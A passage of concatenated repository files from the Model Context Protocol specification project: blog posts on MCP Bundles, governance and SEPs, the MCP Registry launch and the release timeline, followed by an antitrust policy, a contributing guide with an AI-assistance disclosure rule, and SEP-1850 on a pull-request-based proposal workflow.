their work once and reach users across the ecosystem.\n- **Ecosystem-wide tooling:** The `mcpb` CLI and associated libraries are now open for the community to extend, improve, and build upon. Client developers can adopt standardized code for loading and verifying bundles.\n- **User-friendly installation:** End users benefit from a consistent installation experience regardless of which AI application they prefer. Configuration variables, permissions, and updates can be handled uniformly.\n- **Shared community:** MCPB contributors can now collaborate in the open with the rest of the [MCP community](https://modelcontextprotocol.io/community/communication).\n\n## What this means for developers\n\nThis transition is mostly a logistical change, but also brings some benefits to implementers. For those that are building:\n\n- **Servers:** You can use MCPB to package your local MCP servers for distribution across multiple clients. The `mcpb` CLI helps you create a `manifest.json` and package your server into a `.mcpb` file. Once packaged, users can install your server with a single click in any client that supports MCP Bundles.\n- **Clients:** You can add support for MCP Bundles to your application using the open source toolchain. [The repository](https://github.com/modelcontextprotocol/mcpb) includes the schemas and key functions used by Claude for macOS and Windows to implement bundle support, which you can adapt for your own client.\n\n## Getting started\n\nCheck out the repo to get started: [modelcontextprotocol/mcpb](https://github.com/modelcontextprotocol/mcpb). We encourage [feedback](https://github.com/modelcontextprotocol/mcpb/issues) and contributions!\n\n## Acknowledgements\n\nThanks to the MCP contributors and maintainers involved in making this happen, including:\n\n- [David Soria Parra](https://github.com/dsp-ant) (_MCP Lead Maintainer_)\n- [Adam Jones](https://github.com/domdomegg) (_MCP Maintainer_)\n- [Joan Xie](https://github.com/joan-anthropic) (_MCPB Maintainer_)\n- [Felix Rieseberg](https://github.com/felixrieseberg) (_MCPB Maintainer_)\n- [Alex Sklar](https://github.com/asklar) (_MCPB Maintainer_)\n"}

That's a wonderful problem to have, but with growth come growing pains. Our existing processes, which worked well for a small team, have started to show their limits.\n\nToday, we're taking a big step to ensure MCP can continue to grow and thrive. We're introducing a formal governance model designed to bring clarity to the development process while preserving the collaborative, open source spirit that has made MCP successful.\n\n## Specification Enhancement Proposals (SEPs)\n\nOne of the first major changes we're introducing is [Specification Enhancement Proposals](https://modelcontextprotocol.io/community/sep-guidelines) (SEPs). This will be the primary mechanism for anyone to propose changes to MCP. SEPs are inspired by other projects, like [Python PEPs](https://peps.python.org/) or [Rust RFCs](https://github.com/rust-lang/rfcs). We aim to make the process for suggesting changes to Model Context Protocol as straightforward as possible:\n\n1. Following the [SEP guidelines](https://modelcontextprotocol.io/community/sep-guidelines), submit a proposal as [a GitHub issue](https://github.com/modelcontextprotocol/modelcontextprotocol/issues) to start the conversation.\n2. Our maintainers and core maintainers regularly review proposals and tag SEPs for review and sponsorship. You can also reach out and collaborate with contributing folks on [Discord](https://discord.gg/6CSzBmMkjX) or [GitHub](https://github.com/modelcontextprotocol/modelcontextprotocol). Refer to [`MAINTAINERS.md`](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) for a list of currently active maintainers and their focus areas.\n3. Work with the sponsor and the MCP community to move your proposal through draft, review, and implementation stages.\n\nSEPs provide a clear, documented path for evolving the protocol, ensuring that every major change is well-vetted by the community.\n\n## Leadership Roles\n\nThe new model also establishes three types of leadership roles, ensuring both focused ownership and broad community representation:\n\n- **Maintainers** manage specific components like SDKs, our documentation, and individual repositories.\n- **Core Maintainers** guide the overall direction of the project and the evolution of the MCP specification.\n- **Lead Maintainers** serve as the final decision-makers and ensure the project's long-term health.\n\nAll maintainers form the **MCP steering group**. To ensure a structured and timely review of incoming proposals, our core and lead maintainers will meet bi-weekly to review submitted [SEPs](#specification-enhancement-proposals-seps). Meeting notes and decisions will always be public. For example the [notes from the core maintainer meeting on July 23rd, 2025](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1061).\n\n## Get Involved\n\nWe need your help to build the future of MCP, and everyone is welcome here. Whether you're a seasoned open source veteran or just curious about how to get started, there's a place for you in our community.\n\nMany of our maintainers began with a single small contribution—sometimes just fixing a typo or asking a thoughtful question. Every journey starts somewhere, and we're excited to help you take your first step.\n\n- **New Contributors**: Unsure where to begin? Start by helping with documentation, fixing bugs, or building out examples. Every contribution matters, and we're here to support you. Check out issues tagged with [`good first issue`](https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22good%20first%20issue%22) - they're perfect for getting started, and you'll find friendly faces ready to help.\n- **SDK Developers**: Have a favorite programming language? As MCP grows, we need your expertise to build and maintain the protocol SDKs. Your work could empower entire new communities to use MCP.\n- **Documentation Writers**: Clear, comprehensive [documentation](https://modelcontextprotocol.io/introduction) is what turns a good project into a great one. If you love explaining things or making guides, your contributions will help others succeed.\n- **Future Maintainers**: We believe in growing our team from within. The path to becoming a maintainer starts with consistent, quality contributions and a commitment to the project's success. Imagine yourself guiding new contributors and shaping the future of MCP.\n\nNo matter your background or experience, you belong here. Join our [Discord](https://discord.gg/6CSzBmMkjX) to connect with other contributors, ask questions, and find mentorship. Whether you're fixing a typo or proposing a major change to the protocol, your voice is valued and your efforts make a difference.\n\nFor all the details, please see our full [governance documentation](https://modelcontextprotocol.io/community/governance).\n\n## Thank You\n\nNone of this would be possible without the incredible community that has rallied around MCP. From the early adopters who believed in the vision, to the developers building MCP clients and servers, to the maintainers dedicating their time and expertise. Every contribution has been essential to making the Model Context Protocol the success it is today.\n\nYou've helped us identify issues, improve documentation, build SDKs, create compelling examples, and push the boundaries of what's possible with platform integration. Your feedback, bug reports, feature requests, and code contributions have shaped MCP into something far better than we could have built alone.\n\nAs we embark on this next chapter with formal governance, we're more committed than ever to fostering the open, inclusive community that has made MCP thrive. Thank you for being part of this journey - we can't wait to see what we'll build together next.\n"}
{"source":"github","repo":"mcp-spec","path":"blog/content/posts/2025-09-08-mcp-registry-preview.md","content":"+++\ndate = '2025-09-08T00:00:00Z'\ntitle = 'Introducing the MCP Registry'\nauthor = 'David Soria Parra (Lead Maintainer), Adam Jones (Registry Maintainer), Tadas Antanavicius (Registry Maintainer), Toby Padilla (Registry Maintainer), Theodora Chu (MCP PM at Anthropic)'\ntags = ['announcement', 'community']\n+++\n\nToday, we're launching the Model Context Protocol (MCP) Registry—an open catalog and API for publicly available MCP servers to improve discoverability and implementation. By standardizing how servers are distributed and discovered, we’re expanding their reach while making it easier for clients to get connected.\n\nThe MCP Registry is now available in preview. To get started:\n\n- **Add your server** by following our guide on [Adding Servers to the MCP Registry](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/quickstart.mdx) (for server maintainers)\n- **Access server data** by following our guide on [Accessing MCP Registry Data](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/registry-aggregators.mdx) (for client maintainers)\n\n# Single source of truth for MCP servers\n\nIn March 2025, we shared that we wanted to build a central registry for the MCP ecosystem. Today we are announcing that we’ve launched [https://registry.modelcontextprotocol.io](https://registry.modelcontextprotocol.io) as the official MCP Registry. As part of the MCP project, the MCP Registry, as well as a parent [OpenAPI specification](https://github.com/modelcontextprotocol/registry/blob/main/docs/reference/api/official-registry-api.md), are open source—allowing everyone to build a compatible sub-registry.\n\nOur goal is to standardize how servers are distributed and discovered, providing a primary source of truth that sub-registries can build upon. In turn, this will expand server reach and help clients find servers more easily across the MCP ecosystem.\n\n## Public and private sub-registries\n\nIn building a central registry, it was important to us not to take away from existing registries that the community and companies have built. The MCP Registry serves as a primary source of truth for publicly available MCP servers, and organizations can choose to [create sub-registries](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/registry-aggregators.mdx) based on custom criteria. For example:\n\n**Public subregistries** like opinionated “MCP marketplaces” associated with each MCP client are free to augment and enhance data they ingest from the upstream MCP Registry. Every MCP end-user persona will have different needs, and it is up to the MCP client marketplaces to properly serve their end-users in opinionated ways.\n\n**Private subregistries** will exist within enterprises that have strict privacy and security requirements, but the MCP Registry gives these enterprises a single upstream data source they can build upon. At a minimum, we aim to share API schemas with these private implementations so that associated SDKs and tooling can be shared across the ecosystem.\n\nIn both cases, the MCP Registry is the starting point – it’s the centralized location where MCP server maintainers publish and maintain their self-reported information for these downstream consumers to massage and deliver to their end-users.\n\n## Community-driven mechanism for moderation\n\nThe MCP Registry is an official MCP project maintained by the registry working group and permissively licensed. Community members can submit issues to flag servers that violate the MCP [moderation guidelines](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/moderation-policy.mdx)—such as those containing spam, malicious code, or impersonating legitimate services. Registry maintainers can then denylist these entries and retroactively remove them from public access.\n\n# Getting started\n\nTo get started:\n\n- **Add your server** by following our guide on [Adding Servers to the MCP Registry](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/quickstart.mdx) (for server maintainers)\n- **Access server data** by following our guide on [Accessing MCP Registry Data](https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/registry-aggregators.mdx) (for client maintainers)\n\nThis preview of the MCP Registry is meant to help us improve the user experience before general availability and does not provide data durability guarantees or other warranties. We advise MCP adopters to watch development closely as breaking changes may occur before the registry is made generally available.\n\nAs we continue to develop the registry, we encourage feedback and contributions on the [modelcontextprotocol/registry GitHub repository](https://github.com/modelcontextprotocol/registry): Discussion, Issues, and Pull Requests are all welcome.\n\n# Thanks to the MCP community\n\nThe MCP Registry has been a collaborative effort from the beginning and we are incredibly grateful for the enthusiasm and support from the broader developer community.\n\nIn February 2025, it began as a grassroots project when MCP creators [David Soria Parra](https://github.com/dsp-ant) and [Justin Spahr-Summers](https://github.com/jspahrsummers) asked the [PulseMCP](https://www.pulsemcp.com/) and [Goose](https://block.github.io/goose/) teams to help build a centralized community registry. Registry Maintainer [Tadas Antanavicius](https://github.com/tadasant) from [PulseMCP](https://www.pulsemcp.com/) spearheaded the initial effort in collaboration with [Alex Hancock](https://github.com/alexhancock) from [Block](https://block.xyz/). They were soon joined by Registry Maintainer [Toby Padilla](https://github.com/toby), Head of MCP at [GitHub](https://github.com/), and more recently, [Adam Jones](https://github.com/domdomegg) from [Anthropic](https://www.anthropic.com/) joined as Registry Maintainer to drive the project towards the launch today. The [initial announcement](https://github.com/modelcontextprotocol/registry/discussions/11) of the MCP Registry's development lists 16 contributing individuals from at least 9 different companies.\n\nMany others made crucial contributions to bring this project to life: [Radoslav Dimitrov](https://github.com/rdimitrov) from [Stacklok](https://stacklok.com/), [Avinash Sridhar](https://github.com/sridharavinash) from [GitHub](https://github.com/), [Connor Peet](https://github.com/connor4312) from [VS Code](https://code.visualstudio.com/), [Joel Verhagen](https://github.com/joelverhagen) from [NuGet](https://www.nuget.org/), [Preeti Dewani](https://github.com/pree-dew) from [Last9](https://last9.io/), [Avish Porwal](https://github.com/Avish34) from [Microsoft](https://www.microsoft.com/), [Jonathan Hefner](https://github.com/jonathanhefner), and many Anthropic and GitHub employees that provided code reviews and development support. We are also grateful to everyone on the [Registry's contributors log](https://github.com/modelcontextprotocol/registry/graphs/contributors) and those who participated in [discussions and issues](https://github.com/modelcontextprotocol/registry).\n\nWe deeply appreciate everyone investing in this foundational open source infrastructure. Together, we're helping developers and organizations worldwide to build more reliable, context-aware AI applications. On behalf of the MCP community, thank you.\n"}

The specification release date remains to be **November 25th, 2025**.\n\n## Release Timeline\n\nThe next version of the Model Context Protocol specification will be released on **November 25th, 2025**, with a release candidate (RC) available on **November 11th, 2025**.\n\nWe're building in a 14-day RC validation window so client implementors and SDK maintainers can thoroughly test the protocol changes. This approach gives us the focused time we need to deliver critical improvements while applying our [new governance model](https://modelcontextprotocol.io/community/governance) to the process.\n\n## Summer Progress\n\nOur last spec was released on June 18, 2025, and focused on structured tool outputs, OAuth-based authorization, elicitation for server-initiated user interactions, and improved security best practices.\n\nSince then, we’ve focused on establishing additional foundations for the MCP ecosystem:\n\n### Formal Governance Structures\n\nWe established a [formal governance model for MCP](https://modelcontextprotocol.io/community/governance), including defined roles and decision-making mechanisms. We also developed the [Specification Enhancement Proposal (SEP)](https://modelcontextprotocol.io/community/sep-guidelines) process to provide clear guidelines for contributing specification changes.\n\nOur goal is transparency—making decision-making procedures clear and accessible to everyone. Like any new system serving a fast-evolving community, our governance model is still finding its footing. We're actively refining it as both the protocol and community continue to grow.\n\n### Working Groups\n\nWe've launched [Working Groups and Interest Groups](https://modelcontextprotocol.io/community/working-interest-groups) to foster community collaboration. These groups serve multiple purposes:\n\n- Provide clear entry points for new contributors\n- Empower community members to lead initiatives in their areas of expertise\n- Distribute ownership across the ecosystem rather than concentrating it among core maintainers\n\nWe're developing governance structures that will grant these groups greater autonomy in decision-making and implementation. This distributed approach ensures the protocol can grow to meet community needs while maintaining quality and consistency across different domains.\n\n### Registry Development\n\nIn September, we [launched the MCP Registry preview](https://blog.modelcontextprotocol.io/posts/2025-09-08-mcp-registry-preview/)—an open catalog and API for indexing and discovery of MCP servers. The Registry serves as the single source of truth for available MCP servers, supporting both public and private sub-registries that organizations can customize for their specific needs.\n\nBuilding the MCP Registry has been a true community effort. Any MCP client can consume registry content via the native API or through third-party registry aggregators, making it easier for users to discover and integrate MCP servers into their AI workflows.\n\n## Priority Areas for the Next Release\n\nWith governance and infrastructure foundations in place, we're focusing on five key protocol improvements identified by our working groups.\n\n### Asynchronous Operations\n\nCurrently, MCP is built around mostly synchronous operations—when you call a tool, everything stops and waits for it to finish. That works great for quick tasks, but what about operations that take minutes or hours?\n\nThe Agents Working Group is adding async support, allowing servers to kick off long-running tasks while clients can check back later for results. You can follow the progress in [SEP-1391](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1391).\n\n### Statelessness and Scalability\n\nAs organizations deploy MCP servers at enterprise scale, we're seeing new requirements emerge. Current implementations often need to remember things between requests, which makes horizontal scaling across multiple server instances challenging.\n\nWhile [Streamable HTTP](https://modelcontextprotocol.io/specification/2025-03-26/basic/transports#streamable-http) provides some stateless support, pain points remain around server startup and session handling. The Transport Working Group is smoothing out these rough edges, making it easier to run MCP servers in production while keeping simple upgrade paths for teams who want more sophisticated stateful features.\n\n### Server Identity\n\nToday, if you want to know what an MCP server can do, you have to connect to it first. This makes it difficult for clients to browse available servers or for systems like our registry to automatically catalog capabilities.\n\nWe're solving this by letting servers advertise themselves through [`.well-known` URLs](https://en.wikipedia.org/wiki/Well-known_URI)—an established standard for providing metadata. Think of it as a server's business card that anyone can read without having to knock on the door first. This will make discovery much more intuitive for every MCP consumer.\n\n### Official Extensions\n\nAs MCP has grown, we've noticed patterns emerging for specific industries and use cases—valuable implementations that don't necessarily belong in the core protocol specification.\n\nRather than leaving everyone to reinvent the wheel, we're officially recognizing and documenting the most popular protocol extensions. This curated collection of proven patterns will give developers building for specialized domains like healthcare, finance, or education a solid starting point instead of building every custom integration from scratch.\n\n### SDK Support Standardization\n\nChoosing an MCP SDK today can be challenging—it's hard to gauge the level of support or spec compliance you'll get. Some SDKs are lightning-fast with updates, while others might lag behind feature-wise.\n\nWe're introducing a clear tiering system for SDKs. You'll know exactly what you're signing up for before committing to a dependency, based on factors like specification compliance speed, maintenance responsiveness, and feature completeness.\n\n## Call for Contributors\n\nMCP is only as strong as the community behind it. Whether you're an individual developer passionate about building SDKs or a company looking to invest in the ecosystem, we need your help in several key areas.\n\n### SDK Maintenance\n\n- [**TypeScript SDK**](https://github.com/modelcontextprotocol/typescript-sdk) - Needs additional maintainers for feature development and bug fixes\n- [**Swift SDK**](https://github.com/modelcontextprotocol/swift-sdk) - Requires attention for Apple ecosystem support\n- [Other language SDKs](https://modelcontextprotocol.io/docs/sdk) welcome continued contributions\n\n### Tooling\n\n- [**Inspector**](https://github.com/modelcontextprotocol/inspector) - Development and maintenance of debugging tools for MCP server developers\n- [**Registry**](https://github.com/modelcontextprotocol/registry) - Backend API and CLI development; **Go expertise would be particularly welcome**\n\n## Input from Client Developers\n\nWe talk a lot about MCP servers, but clients are equally important—they're the bridge connecting users to the entire MCP ecosystem. If you're building an MCP client, you're seeing the protocol from a unique angle, and we need that perspective embedded in the protocol design.\n\nYour real-world experience with implementation challenges, performance bottlenecks, and user needs directly shapes where the protocol should go next. Whether it's feedback on existing capabilities or ideas for streamlining the developer experience, we want to hear from you.\n\nJoin us in the `#client-implementors` working group channel in the [MCP Discord](https://modelcontextprotocol.io/community/communication).\n\n## Looking Ahead\n\nWith governance structures and working groups in place, we're better positioned to tackle major protocol improvements efficiently while ensuring everyone has a voice in the process. The foundational work we've done this summer gives us a solid base to build from.\n\nThe improvements coming in November—async operations, better scalability, server discovery, and standardized extensions—will help MCP become a stronger backbone for production AI integrations. But we can't do it alone.\n\nMCP's strength has always been that it's an **open protocol built by the community, for the community**. We're excited to keep building it together.\n\nThank you for your continued support, and we look forward to sharing more soon.\n"}

The purpose of this Antitrust Policy (the “Policy”) is to avoid antitrust risks in carrying out this pro-competitive mission.\n\nParticipants in and contributors to the Project (collectively, “participants”) will use their best reasonable efforts to comply in all respects with all applicable state and federal antitrust and trade regulation laws, and applicable antitrust/competition laws of other countries (collectively, the “Antitrust Laws”).\n\nThe goal of Antitrust Laws is to encourage vigorous competition. Nothing in this Policy prohibits or limits the ability of participants to make, sell or use any product, or otherwise to compete in the marketplace. This Policy provides general guidance on compliance with Antitrust Law. Participants should contact their respective legal counsel to address specific questions.\n\nThis Policy is conservative and is intended to promote compliance with the Antitrust Laws, not to create duties or obligations beyond what the Antitrust Laws actually require. In the event of any inconsistency between this Policy and the Antitrust Laws, the Antitrust Laws preempt and control.\n\n**Participation**\n\nTechnical participation in the Project shall be open to all, subject only to compliance with the provisions of the Project’s charter and other governance documents.\n\n**Conduct of Meetings**\n\nAt meetings among actual or potential competitors, there is a risk that participants in those meetings may improperly disclose or discuss information in violation of the Antitrust Laws or otherwise act in an anti-competitive manner. To avoid this risk, participants must adhere to the following policies when participating in Project-related or sponsored meetings, conference calls, or other forums (collectively, “Project Meetings”).\n\nParticipants must not, in fact or appearance, discuss or exchange information regarding:\n\n- An individual company’s current or projected prices, price changes, price differentials, markups, discounts, allowances, terms and conditions of sale, including credit terms, etc., or data that bear on prices, including profits, margins or cost.\n- Industry-wide pricing policies, price levels, price changes, differentials, or the like.\n- Actual or projected changes in industry production, capacity or inventories.\n- Matters relating to bids or intentions to bid for particular products, procedures for responding to bid invitations or specific contractual arrangements.\n- Plans of individual companies concerning the design, characteristics, production, distribution, marketing or introduction dates of particular products, including proposed territories or customers.\n- Matters relating to actual or potential individual suppliers that might have the effect of excluding them from any market or of influencing the business conduct of firms toward such suppliers.\n- Matters relating to actual or potential customers that might have the effect of influencing the business conduct of firms toward such customers.\n- Individual company current or projected cost of procurement, development or manufacture of any product.\n- Individual company market shares for any product or for all products.\n- Confidential or otherwise sensitive business plans or strategy.\n\nIn connection with all Project Meetings, participants must do the following:\n\n- Adhere to prepared agendas.\n- Insist that meeting minutes be prepared and distributed to all participants, and that meeting minutes accurately reflect the matters that transpired.\n- Consult with their respective counsel on all antitrust questions related to Project Meetings.\n- Protest against any discussions that appear to violate these policies or the Antitrust Laws, leave any meeting in which such discussions continue, and either insist that such protest be noted in the minutes.\n\n**Requirements/Standard Setting**\n\nThe Project may establish standards, technical requirements and/or specifications for use (collectively, “requirements”). Participants shall not enter into agreements that prohibit or restrict any participant from establishing or adopting any other requirements. Participants shall not undertake any efforts, directly or indirectly, to prevent any firm from manufacturing, selling, or supplying any product not conforming to a requirement.\n\nThe Project shall not promote standardization of commercial terms, such as terms for license and sale.\n\n**Contact Information**\n\nTo contact the Project regarding matters addressed by this Antitrust Policy, please send an email to antitrust@modelcontextprotocol.io, and reference “Antitrust Policy” in the subject line.\n"}

Create a new branch:\n\n   ```bash\n   git checkout -b feature/your-feature-name\n   ```\n\n## Schema changes\n\nSchema changes go in `schema/draft/schema.ts`. To validate your changes, run:\n\n```bash\nnpm run check:schema:ts\n```\n\n`schema/draft/schema.json` and `docs/specification/draft/schema.mdx` are generated from `schema/draft/schema.ts`; do not edit them directly. To generate them, run:\n\n```bash\nnpm run generate:schema\n```\n\n## Documentation changes\n\nDocumentation is written in MDX format and in the [`docs`](./docs) directory.\n\nYou can preview documentation changes locally by running:\n\n```bash\nnpm run serve:docs\n```\n\nAnd lint them with:\n\n```bash\nnpm run check:docs\nnpm run format\n```\n\n> [!NOTE]\n> You can run all schema/documentation\n> changes at once with `npm run prep:changes`.\n\n## Blog changes\n\nThe blog is built using [Hugo](https://gohugo.io/installation/) and located in the [`blog`](./blog) directory.\n\nTo preview blog changes locally:\n\n```bash\nnpm run serve:blog\n```\n\n### Documentation Guidelines\n\nWhen contributing to the documentation:\n\n- Keep content clear, concise, and technically accurate\n- Follow the existing file structure and naming conventions\n- Include code examples where appropriate\n- Use proper MDX formatting and components\n- Test all links and code samples\n  - You may run `npm run check:docs:links` to look for broken internal links.\n- Use appropriate headings: \"When to use\", \"Steps\", and \"Tips\" for tutorials\n- Place new pages in appropriate sections (concepts, tutorials, etc.)\n- Update `docs.json` when adding new pages\n- Follow existing file naming conventions (`kebab-case.mdx`)\n- Include proper frontmatter in MDX files\n\n## Specification Proposal Guidelines\n\n### Principles of MCP\n\n1. **Simple + Minimal**: It is much easier to add things to a specification than it is to\n   remove them. To maintain simplicity, we keep a high bar for adding new concepts and\n   primitives as each addition requires maintenance and compatibility consideration.\n2. **Concrete**: Specification changes need to be based on specific implementation\n   challenges and not on speculative ideas.\n\n### Stages of a specification proposal\n\n1. **Define**: Explore the problem space, validate that other MCP users face a similar\n   issue, and then clearly define the problem.\n2. **Prototype**: Build an example solution to the problem and demonstrate its practical\n   application.\n3. **Write**: Based on the prototype, write a specification proposal.\n\n## Submitting Changes\n\n1. Push your changes to your fork\n2. Submit a pull request to the main repository\n3. Follow the pull request template\n4. Wait for review\n\n## AI Contributions\n\n> [!IMPORTANT]\n>\n> If you are using **any kind of AI assistance** to contribute to Model Context Protocol,\n> it must be disclosed in the pull request or issue.\n\nWe welcome and encourage the use of AI tools to help improve Model Context Protocol. Many valuable contributions\nhave been enhanced with AI assistance for code generation, issue detection, and feature definition.\n\nThat being said, if you are using any kind of AI assistance (e.g., agents such as Claude Code, ChatGPT)\nwhile contributing to Model Context Protocol, **this must be disclosed in the pull request or issue**,\nalong with the extent to which AI assistance was used (e.g., documentation comments vs. code generation).\n\nIf your PR responses or comments are being generated by an AI, disclose that as well.\n\nAs an exception, trivial spacing or typo fixes don't need to be disclosed, so long as the changes are\nlimited to small parts of the code or short phrases.\n\nAn example disclosure:\n\n> This PR was written primarily by Claude Code.\n\nOr a more detailed disclosure:\n\n> I consulted ChatGPT to understand the codebase but the solution\n> was fully authored manually by myself.\n\nFailure to disclose this is first and foremost rude to the human operators on the other end of the pull request,\nbut it also makes it difficult to determine how much scrutiny to apply to the contribution.\n\nIn a perfect world, AI assistance would produce equal or higher quality work than any human. That isn't the world\nwe live in today, and in most cases where human supervision or expertise is not in the loop, it's generating code\nor changes that cannot be reasonably maintained or evolved.\n\n### What we're looking for\n\nWhen submitting AI-assisted contributions, please ensure they include:\n\n- **Clear disclosure of AI use** - You are transparent about AI use and degree to which you're using it for the contribution\n- **Human understanding** - You personally understand what the changes do\n- **Clear rationale** - You can explain why the change is needed and how it fits within Model Context Protocol goals\n- **Concrete evidence** - Include test cases, scenarios, or examples that demonstrate the improvement\n- **Your own analysis** - Share your thoughts on the end-to-end experience\n\n### What we'll close\n\nWe reserve the right to close submissions that appear to not follow the disclosure policy.\n\n## License\n\nBy contributing, you agree that your contributions will be licensed under the MIT\nLicense.\n\n## Security\n\nPlease review our [Security Policy](SECURITY.md) for reporting security issues.\n"}

{"source":"github","repo":"mcp-spec","path":"seps/1850-pr-based-sep-workflow.md","content":"# SEP-1850: PR-Based SEP Workflow\n\n- **Status**: Final\n- **Type**: Process\n- **Created**: 2025-11-20\n- **Accepted**: 2025-11-28, 8 Yes, 0 No, 0 Absent per vote in Discord.\n- **Author(s)**: Nick Cooper (@nickcoai), David Soria Parra (@davidsp)\n- **Sponsor**: David Soria Parra (@davidsp)\n- **PR**: https://github.com/modelcontextprotocol/specification/pull/1850\n\n## Abstract\n\nThis SEP formalizes the pull request-based SEP workflow that stores proposals as markdown files in the `seps/` directory of the Model Context Protocol specification repository. The workflow assigns SEP numbers from pull request numbers, maintains version history in Git, and replaces the previous GitHub Issues-based process. This establishes a file-based approach as the canonical way to author, review, and accept SEPs.\n\n## Motivation\n\nThe issue-based SEP process introduced several challenges:\n\n- **Dispersed content**: Proposal content was scattered across GitHub issues, linked documents, and pull requests, making review and archival difficult.\n- **Difficult collaboration**: Maintaining long-form specifications in issue bodies made iterative edits and multi-contributor collaboration harder.\n- **Limited version control**: GitHub issues don't provide the same version control capabilities as Git-managed files.\n- **Unclear status management**: The process lacked clear mechanisms for tracking status transitions and ensuring consistency between different sources of truth.\n\nA file-based workflow addresses these issues by:\n\n- Keeping every SEP in version control alongside the specification itself\n- Providing Git's built-in review tooling, history, and searchability\n- Linking SEP numbers to pull requests to eliminate manual bookkeeping\n- Surfacing all discussion in the pull request thread\n- Using PR labels in conjunction with file status for better discoverability\n\n## Specification\n\n### 1. Canonical Location\n\n- Every SEP lives in `seps/{NUMBER}-{slug}.md` in the specification repository\n- The SEP number is always the pull request number that introduces the SEP file\n- The `seps/` directory serves as the single source of truth for all SEPs\n\n### 2. Author Workflow\n\n1. **Draft the proposal** in `seps/0000-{slug}.md` using `0000` as a placeholder number\n2. **Open a pull request** containing the draft SEP and any supporting materials\n3. **Request a sponsor** from the Maintainers list; tag potential sponsors from [MAINTAINERS.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md)\n4. **After the PR number is known**, amend the commit to rename the file to `{PR-number}-{slug}.md` and update the header (`SEP-{PR-number}` and `PR: #{PR-number}`)\n5. **Wait for sponsor assignment**: Once a sponsor agrees, they will assign themselves and update the status to `Draft`\n\n### 3. Sponsor Responsibilities\n\nA Sponsor is a Core Maintainer or Maintainer who champions the SEP through the review process. The sponsor's responsibilities include:\n\n- **Reviewing the proposal** and providing constructive feedback\n- **Requesting changes** based on community input\n- **Managing status transitions** by:\n  - Ensuring that the `Status` field in the SEP markdown file is accurate\n  - Applying matching PR labels to keep them in sync with the file status\n  - Communicating status changes via PR comments\n- **Initiating formal review** when the SEP is ready (moving from `Draft` to `In-Review`)\n- **Raising to Core-Maintainers** ensuring the SEP is presented at the Core Maintainer meeting and that author and sponsor present.\n- **Ensuring quality standards** are met before advancing the proposal\n- **Tracking implementation** progress and ensuring reference implementations are complete before `Final` status\n\n### 4. Review Flow\n\nStatus progression follows: `Draft → In-Review → Accepted → Final`\n\nAdditional terminal states: `Rejected`, `Withdrawn`, `Superseded`, `Dormant`\n\n**Dormant status**: If a SEP does not find a sponsor within six months, Core Maintainers may close the PR and mark the SEP as `dormant`.\n\nReference implementations must be tracked via linked pull requests or issues and must be complete before marking a SEP as `Final`.\n\n### 5. Documentation\n\n- `docs/community/sep-guidelines.mdx` serves as the contributor-facing instructions\n- `seps/README.md` provides the concise reference for formatting, naming, sponsor responsibilities, and acceptance criteria\n- Both documents must reflect this workflow and be kept in sync\n\n### 6. SEP File Structure\n\nEach SEP must include:\n\n```markdown\n# SEP-{NUMBER}: {Title}\n\n- **Status**: Draft | In-Review | Accepted | Rejected | Withdrawn | Final | Superseded | Dormant\n- **Type**: Standards Track | Informational | Process\n- **Created**: YYYY-MM-DD\n- **Author(s)**: Name <email> (@github-username)\n- **Sponsor**: @github-username (or \"None\" if seeking sponsor)\n- **PR**: https://github.com/modelcontextprotocol/specification/pull/{NUMBER}\n\n## Abstract\n\n## Motivation\n\n## Specification\n\n## Rationale\n\n## Backward Compatibility\n\n## Security Implications\n\n## Reference Implementation\n```\n\n### 7. Status Management via PR Labels\n\nTo improve discoverability and filtering:\n\n- Sponsors must apply PR labels that match the SEP status (`draft`, `in-review`, `accepted`, `final`, etc.)\n- Both the markdown `Status` field and PR labels should be kept in sync\n- The markdown file serves as the canonical record (versioned with the proposal)\n- PR labels enable easy filtering and searching for SEPs by status\n- Only sponsors should modify status fields and labels; authors should request changes through their sponsor\n\n### 8. Legacy Considerations\n\n- Contributors may optionally open a GitHub Issue for early discussion, but the authoritative SEP text lives in `seps/`\n- Issues should link to the relevant file once a pull request exists\n- SEP numbers are derived from PR numbers, not issue numbers\n\n## Rationale\n\n### Why File-Based?\n\nStoring SEPs as files keeps authoritative specs versioned with the code, mirroring successful processes used by PEPs (Python Enhancement Proposals) and other standards bodies. This approach:\n\n- Provides built-in version control via Git\n- Enables standard code review workflows\n- Maintains clear history of all changes\n- Supports multi-contributor collaboration\n- Integrates naturally with the specification repository\n\n### Why PR Numbers?\n\nUsing pull request numbers:\n\n- Eliminates race conditions around manual numbering\n- Creates natural traceability between proposal and discussion\n- Prevents number conflicts\n- Simplifies the contribution process\n- Maintains a single discussion thread for review\n\n### Why PR Labels?\n\nAdding PR labels alongside the file status:\n\n- Enables quick filtering of SEPs by status without opening files\n- Provides immediate visibility of SEP states in PR lists\n- Supports GitHub's search and filter capabilities\n- Complements the canonical markdown status field\n- Reduces friction for maintainers managing multiple SEPs\n\n### Making This the Primary Process\n\nMaintaining two overlapping canonical processes risked divergence and created confusion for contributors. Establishing the file-based approach as the primary method:\n\n- Reduces cognitive overhead for new contributors\n- Ensures consistency in the SEP corpus\n- Simplifies maintenance for sponsors\n- Aligns with industry best practices\n\n## Backward Compatibility\n\n- Existing issue-based SEPs remain valid and require no migration\n- Historical GitHub Issue links continue to work\n- Future SEPs should reference the new file locations in `seps/`\n- Maintainers may optionally backfill historical SEPs into `seps/` for archival purposes\n\n## Security Implications\n\nNo new security considerations beyond the standard code review process for pull requests.\n\n## Reference Implementation\n\n- This pull request (#1850) implements the canonical instructions in both `seps/README.md` and `docs/community/sep-guidelines.mdx`\n- The process has been updated to reflect the PR-based workflow with status management via labels\n- This SEP document itself serves as an example of the new format\n\n# Vote\n\nThis SEP was accepted unanimously by the MCP Core Maintainers with a vote of 8 yes's, 0 no's and 0 absent votes on Friday December 28th, 2025 in a Discord 